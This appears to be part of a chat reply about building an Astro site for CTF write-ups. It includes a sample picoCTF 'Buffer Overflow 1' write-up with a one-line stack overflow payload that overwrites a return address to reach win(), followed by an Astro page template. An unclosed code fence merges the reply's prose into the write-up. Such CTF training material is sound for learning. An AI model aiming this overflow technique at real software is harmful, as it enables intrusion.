---
title: "picoCTF: Buffer Overflow 1"
date: 2026-03-02
ctf: "picoCTF"
difficulty: "Easy"
tags: ["pwn", "buffer-overflow", "pwntools"]
summary: "Classic stack buffer overflow: find offset, overwrite return address, jump to win()."
---

## Goal
Get control of execution and call `win()`.

## Notes
```bash
checksec ./vuln
gdb ./vuln

Exploit
python3 -c 'print("A"*112 + "\x96\x92\x04\x08")'

That will remove the schema error.

> You can pick any date, but it must be a real date format like `YYYY-MM-DD`.

---

## 2) Make the writeup page use MainLayout + terminal look

You need an Astro page that renders a single writeup entry and wraps it in your layout.

Create this file:

`src/pages/writeups/[...slug].astro`

Paste this:

```astro
---
import MainLayout from "../../layouts/MainLayout.astro";
import { getCollection } from "astro:content";

export async function getStaticPaths() {
  const writeups = await getCollection("writeups");
  return writeups.map((w) => ({
    params: { slug: w.slug },
    props: { w },
  }));
}

const { w } = Astro.props;
const { Content } = await w.render();
---

<MainLayout title={`${w.data.title} | Tyler Rivers`} pageClass="writeup-terminal">
  <h1>{w.data.title}</h1>
  <p class="muted">
    {w.data.ctf}{w.data.difficulty ? ` • ${w.data.difficulty}` : ""} • {w.data.date.toLocaleDateString()}
  </p>

  <Content />
  </MainLayout>